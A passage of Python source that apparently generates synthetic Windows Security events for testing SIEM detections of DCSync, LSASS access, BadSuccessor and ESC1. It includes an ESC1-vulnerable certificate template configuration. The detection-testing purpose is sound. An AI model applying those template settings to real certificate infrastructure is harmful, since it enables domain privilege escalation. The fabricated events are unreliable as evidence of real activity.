                workstation_override=None, ip_override=None,
                source_workstation=None, ts=None) -> dict:
    """4625 – An account failed to log on.

    workstation_override — host that *logs* the event (computer_name).
    source_workstation   — host that *sent* the logon request (WorkstationName
                           inside event_data).  Defaults to computer_name.
    """
    domain = _get_domain(config)
    computer = _fqdn(workstation_override or user_info["hostname"], config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "-"
    port = str(random.randint(49152, 65535))

    if auth_pkg is None:
        auth_pkg = _NTLM_PACKAGE_SHORT if logon_type == 3 else _NEG_PACKAGE

    # Pick failure reason if not specified — most common is bad password.
    # _FAILURE_REASONS tuples: (status, sub_status, failure_reason_%%_code)
    if status is None and sub_status is None:
        status, sub_status, failure_reason = random.choice(_FAILURE_REASONS)
    elif status is not None and sub_status is None:
        match = next((t for t in _FAILURE_REASONS if t[0].lower() == status.lower()), None)
        sub_status = match[1] if match else "0x0"
        failure_reason = failure_reason or (match[2] if match else "%%2304")
    elif sub_status is not None and status is None:
        match = next((t for t in _FAILURE_REASONS if t[1].lower() == sub_status.lower()), None)
        status = match[0] if match else "0xC000006D"
        failure_reason = failure_reason or (match[2] if match else "%%2304")
    else:
        match = next((t for t in _FAILURE_REASONS if t[0].lower() == status.lower()), None)
        failure_reason = failure_reason or (match[2] if match else "%%2304")

    lp_category = {2: "interactive", 3: "network", 4: "service", 5: "service",
                   7: "unlock", 10: "remote", 11: "cached"}.get(logon_type, "network")
    proc_id, proc_name = random.choice(
        _LOGON_PROCESSES_BY_TYPE.get(lp_category, _LOGON_PROCESSES_DEFAULT))
    if auth_pkg == _KRB_PACKAGE:
        lp_name = "Kerberos"
    elif auth_pkg == _NTLM_PACKAGE_SHORT:
        lp_name = "NtLmSsp "
    elif auth_pkg == _NEG_PACKAGE:
        lp_name = random.choice(["User32 ", "Advapi  ", "Negotiate"])
    else:
        lp_name = random.choice(_LOGON_PROCESS_NAMES.get(lp_category, ["NtLmSsp "]))

    # For network/remote failures the Subject is NULL (auth hasn't completed).
    # For interactive/service failures the Subject is SYSTEM/machine account.
    if logon_type in (3, 10):
        subj_sid = _SID_ANON
        subj_name = "-"
        subj_domain = "-"
        subj_logon_id = "0x0"
        fail_proc_id = "0x0"
        fail_proc_name = "-"
    else:
        subj_sid = _SID_SYSTEM
        subj_name = computer.split(".")[0].upper() + "$"
        subj_domain = domain
        subj_logon_id = "0x3e7"
        fail_proc_id = proc_id
        fail_proc_name = proc_name

    target_domain = domain

    event_data = {
        "SubjectUserSid":            subj_sid,
        "SubjectUserName":           subj_name,
        "SubjectDomainName":         subj_domain,
        "SubjectLogonId":            subj_logon_id,
        "TargetUserSid":             _SID_ANON,
        "TargetUserName":            user_info["username"],
        "TargetDomainName":          target_domain,
        "Status":                    status,
        "FailureReason":             failure_reason,
        "SubStatus":                 sub_status,
        "LogonType":                 str(logon_type),
        "LogonProcessName":          lp_name,
        "AuthenticationPackageName": auth_pkg,
        "WorkstationName":           (source_workstation or computer).split(".")[0].upper(),
        "TransmittedServices":       "-",
        "LmPackageName":             "-",
        "KeyLength":                 "0",
        "ProcessId":                 fail_proc_id,
        "ProcessName":               fail_proc_name,
        "IpAddress":                 _format_logon_ip(ip, logon_type),
        "IpPort":                    str(random.randint(49152, 65535)) if logon_type in (3, 10) else "0",
    }

    with _STATE_LOCK:
        _FAIL_COUNTS[user_info["username"]] = _FAIL_COUNTS.get(user_info["username"], 0) + 1

    return _build_event(
        4625, computer, event_data, success=False, ts=ts,
    )


def _pop_open_session(hostname, username=None):
    """Pop (and return) an open logon session for a hostname, optionally filtered by user.

    Returns None if no matching session exists.  Runs under the state lock.
    """
    with _STATE_LOCK:
        sessions = _OPEN_SESSIONS.get(hostname, [])
        for i, s in enumerate(sessions):
            if username is None or s["target_user_name"] == username:
                return sessions.pop(i)
    return None


def _build_4634(session_row, config, ts=None) -> dict:
    """4634 – An account was logged off (system-generated)."""
    computer = session_row.get("computer") or session_row["workstation"]
    if "." not in computer:
        computer = f"{computer}.{_get_dns_domain(config)}"
    event_data = {
        "TargetUserSid":    session_row["target_user_sid"],
        "TargetUserName":   session_row["target_user_name"],
        "TargetDomainName": session_row["target_domain"],
        "TargetLogonId":    session_row["logon_id"],
        "LogonType":        str(session_row["logon_type"]),
    }
    return _build_event(4634, computer, event_data, success=True, ts=ts,
)


def _build_4647(session_row, config, ts=None) -> dict:
    """4647 – User initiated logoff (emitted only for interactive logon types)."""
    computer = session_row.get("computer") or session_row["workstation"]
    if "." not in computer:
        computer = f"{computer}.{_get_dns_domain(config)}"
    event_data = {
        "TargetUserSid":    session_row["target_user_sid"],
        "TargetUserName":   session_row["target_user_name"],
        "TargetDomainName": session_row["target_domain"],
        "TargetLogonId":    session_row["logon_id"],
    }
    return _build_event(4647, computer, event_data, success=True, ts=ts,
)


def _build_4648(user_info, config, *, target_user, target_server,
                process_name="C:\\Windows\\System32\\runas.exe",
                ip_override=None, ts=None) -> dict:
    """4648 – A logon was attempted using explicit credentials (runas/scheduled task)."""
    domain = _get_domain(config)
    computer = _fqdn(user_info["hostname"], config)
    ip = ip_override if ip_override is not None else user_info.get("ip") or "::1"
    is_local = target_server in ("localhost", "127.0.0.1", "::1",
                                  computer.split(".")[0].lower(),
                                  computer.lower())
    if is_local:
        ip_field = "::1"
    elif ip and "." in str(ip):
        ip_field = f"::ffff:{ip}"
    else:
        ip_field = ip or "-"
    event_data = {
        "SubjectUserSid":       _stable_user_sid(user_info["username"]),
        "SubjectUserName":      user_info["username"],
        "SubjectDomainName":    domain,
        "SubjectLogonId":       _new_logon_id(),
        "LogonGuid":            "{00000000-0000-0000-0000-000000000000}",
        "TargetUserName":       target_user,
        "TargetDomainName":     domain,
        "TargetLogonGuid":      "{00000000-0000-0000-0000-000000000000}",
        "TargetServerName":     target_server,
        "TargetInfo":           target_server,
        "ProcessId":            "0x%x" % random.randint(0x4, 0x9fff),
        "ProcessName":          process_name,
        "IpAddress":            ip_field,
        "IpPort":               "0",
    }
    return _build_event(4648, computer, event_data, success=True, ts=ts,
)


def _build_4740(user_info, config, *, source_workstation=None, ts=None) -> dict:
    """4740 – A user account was locked out (emitted by a DC).

    NOTE: TargetDomainName in 4740 is a schema quirk — it holds the
    **caller computer name** (source of the bad logon attempts), NOT
    the domain.  XSIAM reads this field as the lockout source host.
    """
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    caller = source_workstation or user_info.get("hostname") or "UNKNOWN"
    caller_short = caller.split(".")[0].upper()
    event_data = {
        "TargetUserName":     user_info["username"],
        "TargetDomainName":   caller_short,
        "TargetSid":          _stable_user_sid(user_info["username"]),
        "SubjectUserSid":     _SID_SYSTEM,
        "SubjectUserName":    _get_dc_short(config) + "$",
        "SubjectDomainName":  domain,
        "SubjectLogonId":     "0x3e7",
    }
    return _build_event(4740, dc_host, event_data, success=True, ts=ts)


# Privileges assigned during admin/elevated logons
_ADMIN_PRIVILEGES = [
    "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege", "SeSecurityPrivilege",
    "SeTakeOwnershipPrivilege", "SeLoadDriverPrivilege", "SeBackupPrivilege",
    "SeRestorePrivilege", "SeDebugPrivilege", "SeAuditPrivilege",
    "SeSystemEnvironmentPrivilege", "SeImpersonatePrivilege",
    "SeDelegateSessionUserImpersonatePrivilege",
]
_SERVICE_PRIVILEGES = [
    "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege", "SeSecurityPrivilege",
    "SeTakeOwnershipPrivilege", "SeLoadDriverPrivilege", "SeBackupPrivilege",
    "SeRestorePrivilege", "SeDebugPrivilege", "SeAuditPrivilege",
    "SeSystemEnvironmentPrivilege", "SeImpersonatePrivilege",
    "SeDelegateSessionUserImpersonatePrivilege",
]
_NORMAL_USER_PRIVILEGES = [
    "SeSecurityPrivilege", "SeBackupPrivilege", "SeRestorePrivilege",
    "SeDebugPrivilege", "SeImpersonatePrivilege",
]


def _build_4672(user_info, config, *, logon_id=None, is_admin=False,
                is_service=False, sid_override=None, domain_override=None,
                ts=None) -> dict:
    """4672 – Special privileges assigned to new logon."""
    domain = domain_override or _get_domain(config)
    computer = _fqdn(user_info["hostname"], config)
    if is_service:
        privs = _SERVICE_PRIVILEGES
    elif is_admin:
        privs = _ADMIN_PRIVILEGES
    else:
        privs = random.sample(_NORMAL_USER_PRIVILEGES,
                              k=random.randint(2, len(_NORMAL_USER_PRIVILEGES)))
    event_data = {
        "SubjectUserSid":    sid_override or _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "PrivilegeList":     " ".join(privs),
    }
    return _build_event(4672, computer, event_data, success=True, ts=ts)


def _build_4688(user_info, config, *, process_name, command_line="",
                parent_process="C:\\Windows\\explorer.exe",
                logon_id=None, sid_override=None, domain_override=None,
                ts=None) -> dict:
    """4688 – A new process has been created."""
    domain = _get_domain(config)
    target_domain = domain_override or domain
    computer = _fqdn(user_info["hostname"], config)
    new_pid = "0x%x" % random.randint(0x200, 0xffff)
    parent_pid = "0x%x" % random.randint(0x100, 0x9fff)
    event_data = {
        "SubjectUserSid":    _SID_SYSTEM,
        "SubjectUserName":   computer.split(".")[0].upper() + "$",
        "SubjectDomainName": domain,
        "SubjectLogonId":    "0x3e7",
        "NewProcessId":      new_pid,
        "NewProcessName":    process_name,
        "TokenElevationType":"%%1936",
        "ProcessId":         parent_pid,
        "CommandLine":       command_line,
        "TargetUserSid":     sid_override or _stable_user_sid(user_info["username"]),
        "TargetUserName":    user_info["username"],
        "TargetDomainName":  target_domain,
        "TargetLogonId":     logon_id or _new_logon_id(),
        "ParentProcessName": parent_process,
        "MandatoryLabel":    "S-1-16-12288",
    }
    return _build_event(4688, computer, event_data, success=True, ts=ts)


def _build_4689(user_info, config, *, process_name, process_id=None,
                logon_id=None, sid_override=None, domain_override=None,
                ts=None) -> dict:
    """4689 – A process has exited."""
    domain = domain_override or _get_domain(config)
    computer = _fqdn(user_info["hostname"], config)
    event_data = {
        "SubjectUserSid":    sid_override or _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "Status":            "0x0",
        "ProcessId":         process_id or ("0x%x" % random.randint(0x200, 0xffff)),
        "ProcessName":       process_name,
    }
    return _build_event(4689, computer, event_data, success=True, ts=ts)


def _build_4767(user_info, config, *, unlocked_by="Administrator", ts=None) -> dict:
    """4767 – A user account was unlocked (emitted by a DC)."""
    domain = _get_domain(config)
    dc_host = _get_dc_hostname(config)
    event_data = {
        "TargetUserName":    user_info["username"],
        "TargetDomainName":  domain,
        "TargetSid":         _stable_user_sid(user_info["username"]),
        "SubjectUserSid":    _stable_user_sid(unlocked_by),
        "SubjectUserName":   unlocked_by,
        "SubjectDomainName": domain,
        "SubjectLogonId":    _new_logon_id(),
    }
    return _build_event(4767, dc_host, event_data, success=True, ts=ts)


# Access mask -> AccessList message code. The old table mapped the DS rights (0x1..0x100)
# onto the standard-rights %%153x codes, so a Read Property (0x10) event was logged as
# "%%1537" (DELETE). Corrected against msobjs.dll. _threat_dcsync is unaffected: it uses
# only 0x100 -> %%7688, which is identical in both tables — which is precisely why it
# fires while the 4662-heavy generators do not.
_ACCESS_MASK_TO_LIST = {
    "0x1":      "%%7680",   # Create Child
    "0x2":      "%%7681",   # Delete Child
    "0x4":      "%%7682",   # List Contents
    "0x8":      "%%7683",   # Write Self
    "0x10":     "%%7684",   # Read Property
    "0x20":     "%%7685",   # Write Property
    "0x40":     "%%7686",   # Delete Tree
    "0x80":     "%%7687",   # List Object
    "0x100":    "%%7688",   # Control Access
    "0x10000":  "%%1537",   # DELETE
    "0x20000":  "%%1538",   # READ_CONTROL
    "0x40000":  "%%1539",   # WRITE_DAC
    "0x80000":  "%%1540",   # WRITE_OWNER
}


def _build_4662(user_info, config, *, object_type, object_name,
                access_mask="0x100", properties="", operation_type="Object Access",
                logon_id=None, ts=None) -> dict:
    """4662 – An operation was performed on an object (Directory Service Access).

    Used for DCSync detection: replication GUIDs in properties indicate
    DS-Replication-Get-Changes / DS-Replication-Get-Changes-All.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    access_list = _ACCESS_MASK_TO_LIST.get(access_mask, "%%7688") + "\n                "
    event_data = {
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "ObjectServer":      "DS",
        "ObjectType":        object_type,
        "ObjectName":        object_name,
        "OperationType":     operation_type,
        "HandleId":          "0x0",
        "AccessList":        access_list,
        "AccessMask":        access_mask,
        "Properties":        properties,
        "AdditionalInfo":    "-",
        "AdditionalInfo2":   "",
    }
    return _build_event(4662, dc_host, event_data, success=True, ts=ts)


def _build_4656(user_info, config, *, object_type, object_name,
                process_name, access_mask="0x1F0FFF",
                handle_id=None, process_id=None,
                logon_id=None, ts=None) -> dict:
    """4656 – A handle to an object was requested.

    Used for LSASS credential dumping detection: a non-system process
    requesting a handle to lsass.exe with high-privilege access mask.
    """
    domain = _get_domain(config)
    computer = _fqdn(user_info["hostname"], config)
    event_data = {
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "ObjectServer":      "Security",
        "ObjectType":        object_type,
        "ObjectName":        object_name,
        "HandleId":          handle_id or ("0x%x" % random.randint(0x100, 0xffff)),
        "TransactionId":     "{00000000-0000-0000-0000-000000000000}",
        "AccessList":        "%%4484\r\n\t\t\t\t%%4416",
        "AccessReason":      "-",
        "AccessMask":        access_mask,
        "PrivilegeList":     "-",
        "RestrictedSidCount": "0",
        "ProcessId":         process_id or ("0x%x" % random.randint(0x200, 0xffff)),
        "ProcessName":       process_name,
        "ResourceAttributes": "-",
    }
    return _build_event(4656, computer, event_data, success=True, ts=ts)


def _build_4663(user_info, config, *, object_type, object_name,
                process_name, access_mask="0x10", handle_id=None,
                process_id=None, logon_id=None, ts=None) -> dict:
    """4663 – An attempt was made to access an object.

    Follows 4656; indicates the actual read/write on the object handle.
    """
    domain = _get_domain(config)
    computer = _fqdn(user_info["hostname"], config)
    event_data = {
        "SubjectUserSid":    _stable_user_sid(user_info["username"]),
        "SubjectUserName":   user_info["username"],
        "SubjectDomainName": domain,
        "SubjectLogonId":    logon_id or _new_logon_id(),
        "ObjectServer":      "Security",
        "ObjectType":        object_type,
        "ObjectName":        object_name,
        "HandleId":          handle_id or ("0x%x" % random.randint(0x100, 0xffff)),
        "AccessList":        "%%4416",
        "AccessMask":        access_mask,
        "ProcessId":         process_id or ("0x%x" % random.randint(0x200, 0xffff)),
        "ProcessName":       process_name,
        "ResourceAttributes": "-",
    }
    return _build_event(4663, computer, event_data, success=True, ts=ts)


def _build_4741(user_info, config, *, target_computer_name, target_sid,
                sam_account_name, dns_host_name, spns="-",
                new_uac_value="0x80", logon_id=None, ts=None) -> dict:
    """4741 – A computer account was created (DC event).

    Generated when a new computer object is created in AD — including dMSA
    objects, which are of class msDS-DelegatedManagedServiceAccount but
    registered as computer accounts.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":      target_computer_name,
        "TargetDomainName":    domain,
        "TargetSid":           target_sid,
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   domain,
        "SubjectLogonId":      logon_id or _new_logon_id(),
        "PrivilegeList":       "-",
        "SamAccountName":      sam_account_name,
        "DisplayName":         "-",
        "UserPrincipalName":   "-",
        "HomeDirectory":       "-",
        "HomePath":            "-",
        "ScriptPath":          "-",
        "ProfilePath":         "-",
        "UserWorkstations":    "-",
        "PasswordLastSet":     _iso_ts(ts),
        "AccountExpires":      "%%1794",
        "PrimaryGroupId":      "515",
        "AllowedToDelegateTo": "-",
        "OldUacValue":         "0x0",
        "NewUacValue":         new_uac_value,
        "UserAccountControl":  "%%2087",
        "UserParameters":      "-",
        "SidHistory":          "-",
        "LogonHours":          "%%1793",
        "DnsHostName":         dns_host_name,
        "ServicePrincipalNames": spns,
    }
    return _build_event(4741, dc_host, event_data, success=True, ts=ts)


def _build_4742(user_info, config, *, target_computer_name, target_sid,
                sam_account_name, dns_host_name="-", spns="-",
                old_uac_value="-", new_uac_value="-", uac_control="-",
                allowed_to_delegate="-", sid_history="-",
                logon_id=None, ts=None) -> dict:
    """4742 – A computer account was changed (DC event).

    Generated alongside 5136 events when computer account attributes change.
    Unlike 5136, this shows the final-state values (not old→new pairs).
    Only changed attributes have non-"-" values.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "TargetUserName":      target_computer_name,
        "TargetDomainName":    domain,
        "TargetSid":           target_sid,
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   domain,
        "SubjectLogonId":      logon_id or _new_logon_id(),
        "PrivilegeList":       "-",
        "SamAccountName":      sam_account_name,
        "DisplayName":         "-",
        "UserPrincipalName":   "-",
        "HomeDirectory":       "-",
        "HomePath":            "-",
        "ScriptPath":          "-",
        "ProfilePath":         "-",
        "UserWorkstations":    "-",
        "PasswordLastSet":     "-",
        "AccountExpires":      "-",
        "PrimaryGroupId":      "-",
        "AllowedToDelegateTo": allowed_to_delegate,
        "OldUacValue":         old_uac_value,
        "NewUacValue":         new_uac_value,
        "UserAccountControl":  uac_control,
        "UserParameters":      "-",
        "SidHistory":          sid_history,
        "LogonHours":          "-",
        "DnsHostName":         dns_host_name,
        "ServicePrincipalNames": spns,
    }
    return _build_event(4742, dc_host, event_data, success=True, ts=ts)


def _build_4781(user_info, config, *, old_target_user_name, new_target_user_name,
                target_sid, target_domain=None, logon_id=None, ts=None) -> dict:
    """4781 – The name of an account was changed (DC event).

    This is the state-transition event Windows writes for a rename; it carries
    the old and new name on one record. Cortex's "Suspicious sAMAccountName
    change" analytic keys on it, not on the 4742 final-state event alone.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "OldTargetUserName":   old_target_user_name,
        "NewTargetUserName":   new_target_user_name,
        "TargetDomainName":    target_domain or domain,
        "TargetSid":           target_sid,
        "SubjectUserSid":      _stable_user_sid(user_info["username"]),
        "SubjectUserName":     user_info["username"],
        "SubjectDomainName":   domain,
        "SubjectLogonId":      logon_id or _new_logon_id(),
        "PrivilegeList":       "-",
    }
    return _build_event(4781, dc_host, event_data, success=True, ts=ts)


# Well-known SIDs for privileged AD groups
_SID_DOMAIN_ADMINS     = f"{_SYNTH_DOMAIN_SID}-512"
_SID_ENTERPRISE_ADMINS = f"{_SYNTH_DOMAIN_SID}-519"
_SID_BUILTIN_ADMINS    = "S-1-5-32-544"

_PRIVILEGED_GROUPS = {
    "Domain Admins":     {"sid": _SID_DOMAIN_ADMINS,     "event_id": 4728, "remove_id": 4729, "scope": "global"},
    "Enterprise Admins": {"sid": _SID_ENTERPRISE_ADMINS, "event_id": 4756, "remove_id": 4757, "scope": "universal"},
    "Administrators":    {"sid": _SID_BUILTIN_ADMINS,    "event_id": 4732, "remove_id": 4733, "scope": "local"},
}

def _build_4728(user_info, config, *, member_name, member_sid,
                target_group="Domain Admins", target_sid=None,
                logon_id=None, ts=None) -> dict:
    """4728 – A member was added to a security-enabled global group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   domain,
        "TargetSid":          target_sid or _SID_DOMAIN_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4728, dc_host, event_data, success=True, ts=ts)


def _build_4732(user_info, config, *, member_name, member_sid,
                target_group="Administrators", target_sid=None,
                target_domain=None,
                logon_id=None, ts=None) -> dict:
    """4732 – A member was added to a security-enabled local group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   target_domain or "Builtin",
        "TargetSid":          target_sid or _SID_BUILTIN_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4732, dc_host, event_data, success=True, ts=ts)


def _build_4756(user_info, config, *, member_name, member_sid,
                target_group="Enterprise Admins", target_sid=None,
                logon_id=None, ts=None) -> dict:
    """4756 – A member was added to a security-enabled universal group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   domain,
        "TargetSid":          target_sid or _SID_ENTERPRISE_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4756, dc_host, event_data, success=True, ts=ts)


def _build_4729(user_info, config, *, member_name, member_sid,
                target_group="Domain Admins", target_sid=None,
                logon_id=None, ts=None) -> dict:
    """4729 – A member was removed from a security-enabled global group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   domain,
        "TargetSid":          target_sid or _SID_DOMAIN_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4729, dc_host, event_data, success=True, ts=ts)


def _build_4733(user_info, config, *, member_name, member_sid,
                target_group="Administrators", target_sid=None,
                target_domain=None,
                logon_id=None, ts=None) -> dict:
    """4733 – A member was removed from a security-enabled local group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   target_domain or domain,
        "TargetSid":          target_sid or _SID_BUILTIN_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4733, dc_host, event_data, success=True, ts=ts)


def _build_4757(user_info, config, *, member_name, member_sid,
                target_group="Enterprise Admins", target_sid=None,
                logon_id=None, ts=None) -> dict:
    """4757 – A member was removed from a security-enabled universal group (DC event)."""
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    event_data = {
        "MemberName":         member_name,
        "MemberSid":          member_sid,
        "TargetUserName":     target_group,
        "TargetDomainName":   domain,
        "TargetSid":          target_sid or _SID_ENTERPRISE_ADMINS,
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "PrivilegeList":      "-",
    }
    return _build_event(4757, dc_host, event_data, success=True, ts=ts)


_REMOVE_BUILDERS = {4729: _build_4729, 4733: _build_4733, 4757: _build_4757}
_ADD_BUILDERS    = {4728: _build_4728, 4732: _build_4732, 4756: _build_4756}


def _build_5136(user_info, config, *, object_dn, object_class, object_guid,
                attribute_name, attribute_value, attribute_syntax_oid="2.5.5.1",
                operation_type="%%14674", op_correlation_id=None,
                logon_id=None, ts=None) -> dict:
    """5136 – A directory service object was modified (DC event).

    Generated when an AD object attribute is changed.  Each attribute change
    produces a separate 5136; correlated modifications share the same
    OpCorrelationID.  For value changes, two events fire: %%14675 (Value
    Deleted) then %%14674 (Value Added).

    Key detection signal for dMSA/BadSuccessor: AttributeLDAPDisplayName =
    "msDS-ManagedAccountPrecededByLink" with a privileged account DN as value.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    dns_domain = _get_dns_domain(config)
    event_data = {
        "OpCorrelationID":          op_correlation_id or _new_logon_guid(),
        "AppCorrelationID":         "-",
        "SubjectUserSid":           _stable_user_sid(user_info["username"]),
        "SubjectUserName":          user_info["username"],
        "SubjectDomainName":        domain,
        "SubjectLogonId":           logon_id or _new_logon_id(),
        "DSName":                   dns_domain,
        "DSType":                   "%%14676",
        "ObjectDN":                 object_dn,
        "ObjectGUID":               object_guid,
        "ObjectClass":              object_class,
        "AttributeLDAPDisplayName": attribute_name,
        "AttributeSyntaxOID":       attribute_syntax_oid,
        "AttributeValue":           attribute_value,
        "OperationType":            operation_type,
    }
    return _build_event(5136, dc_host, event_data, success=True, ts=ts)


def _build_5137(user_info, config, *, object_dn, object_class, object_guid,
                op_correlation_id=None, logon_id=None, ts=None) -> dict:
    """5137 – A directory service object was created (DC event).

    Generated when a new AD object is created.  For dMSA/BadSuccessor this
    fires when the attacker creates the msDS-DelegatedManagedServiceAccount
    object in an OU they have CreateChild permissions on.
    """
    dc_host = _get_dc_hostname(config)
    domain = _get_domain(config)
    dns_domain = _get_dns_domain(config)
    event_data = {
        "OpCorrelationID":    op_correlation_id or _new_logon_guid(),
        "AppCorrelationID":   "-",
        "SubjectUserSid":     _stable_user_sid(user_info["username"]),
        "SubjectUserName":    user_info["username"],
        "SubjectDomainName":  domain,
        "SubjectLogonId":     logon_id or _new_logon_id(),
        "DSName":             dns_domain,
        "DSType":             "%%14676",
        "ObjectDN":           object_dn,
        "ObjectGUID":         object_guid,
        "ObjectClass":        object_class,
    }
    return _build_event(5137, dc_host, event_data, success=True, ts=ts)


def _get_ca_hostname(config):
    """Return the FQDN of the Certificate Authority server."""
    cfg = _cf(config)
    ca = cfg.get("ca_hostname", "CA01")
    dns = _get_dns_domain(config)
    if "." in ca:
        return ca
    return f"{ca}.{dns}"


_CERT_TEMPLATES_NORMAL = [
    "User", "Machine", "WebServer", "DomainController",
    "SmartcardLogon", "EFS", "CodeSigning",
]

_CERT_TEMPLATES_VULNERABLE = [
    "ESC1-Vulnerable", "WebServerV2", "UserAuth-Legacy",
    "VPN-Certificate", "Workstation-Auth",
]


def _random_ski():
    """Generate a random Subject Key Identifier (20-byte hex)."""
    return " ".join(f"{random.randint(0,255):02x}" for _ in range(20))


def _build_4898(user_info, config, *, template_name, enrollee_supplies_subject=True,
                schema_version="2", template_version="100.2", ts=None) -> dict:
    """4898 - Certificate Services loaded a template (CA event).

    Why this exists: 4898 is the only event that tells XSIAM a certificate template is
    *abusable*. It is in XSIAM's published Object Access intake list and feeds
    "Vulnerable certificate template loaded" and "Suspicious certificate template
    modification" (ESC4). `msPKI-Certificate-Name-Flag = 0x1`
    (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) inside Template Content is the literal ESC1
    condition — a requester may name any subject, including a privileged one.

    CAVEAT: the exact EventData parameter names below could not be confirmed against a
    captured 4898 from this environment; they follow the published field list
    (TemplateInternalName / TemplateVersion / TemplateSchemaVersion / TemplateOID /
    TemplateDSObjectFQDN / TemplateContent / SecurityDescriptor). If the detector stays
    silent with a correct-looking event, verify these names against a real 4898 before
    changing anything else — a wrong EventData key is invisible in the rendered XML.
    """
    ca_host = _get_ca_hostname(config)
    dns_domain = _get_dns_domain(config)
    base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))

    # 0x1 = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (the ESC1 condition); 0x0 = subject built
    # from AD, which is the safe configuration.
    name_flag = "0x1" if enrollee_supplies_subject else "0x0"
    content = (
        f"msPKI-Certificate-Name-Flag: {name_flag}\r\n"
        f"msPKI-Enrollment-Flag: 0x0\r\n"
        f"msPKI-Private-Key-Flag: 0x10\r\n"
        f"msPKI-RA-Signature: 0\r\n"                      # 0 = no manager approval (ESC1)
        f"pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\r\n"     # Client Authentication
        f"msPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2"
    )
    # Authenticated Users granted Enroll — the other half of ESC1.
    sd = ("O:DAG:DAD:PAI(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)"
          "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;EA)"
          "(A;;CCDCLCSWRPWPRC;;;AU)")
    event_data = {
        "SubjectUserSid":         _stable_user_sid(user_info["username"]),
        "SubjectUserName":        user_info["username"],
        "SubjectDomainName":      _get_domain(config),
        "SubjectLogonId":         _new_logon_id(),
        "TemplateInternalName":   template_name,
        "TemplateVersion":        template_version,
        "TemplateSchemaVersion":  schema_version,
        "TemplateOID":            f"1.3.6.1.4.1.311.21.8.{random.randint(1000000, 9999999)}."
                                  f"{random.randint(1000000, 9999999)}",
        "TemplateDSObjectFQDN":   (f"CN={template_name},CN=Certificate Templates,"
                                   f"CN=Public Key Services,CN=Services,"
                                   f"CN=Configuration,{base_dn}"),
        "TemplateContent":        content,
        "SecurityDescriptor":     sd,
    }
    return _build_event(4898, ca_host, event_data, success=True, ts=ts)


def _build_4886(user_info, config, *, template_name, request_id=None,
                san_override=None, san_kind="upn", ts=None) -> dict:
    """4886 – Certificate Services received a certificate request (CA event)."""
    ca_host = _get_ca_hostname(config)
    domain = _get_domain(config)
